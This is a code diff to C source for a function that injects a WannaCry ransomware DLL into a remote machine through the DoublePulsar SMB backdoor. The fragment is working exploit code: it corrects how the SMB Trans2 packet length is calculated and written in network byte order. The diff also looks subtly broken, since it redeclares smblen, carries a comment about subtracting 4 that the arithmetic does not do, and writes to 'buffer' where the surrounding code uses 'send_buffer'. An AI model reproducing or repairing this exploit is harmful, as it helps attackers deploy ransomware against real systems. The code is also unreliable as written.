@@ -298,8 +298,11 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		//size 70
 		memcpy(send_buffer, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
 		//update last packet SMB Length
-		smblen = bytesLeft+70+12; //BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters
-		memcpy(send_buffer+3, &smblen, 1);
+		unsigned short smblen;
+		smblen = bytesLeft+70+12; //BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters - 4 since netBIOS isn't counted
+		unsigned short smb_length_value = htons(smblen);
+		//memcpy(buffer+2, &smblen, 2);
+		memcpy(buffer+2, &smb_length_value, 2);
 
 		//copy parameters
 		memcpy(send_buffer + 70 , Parametersbuffer, 12);
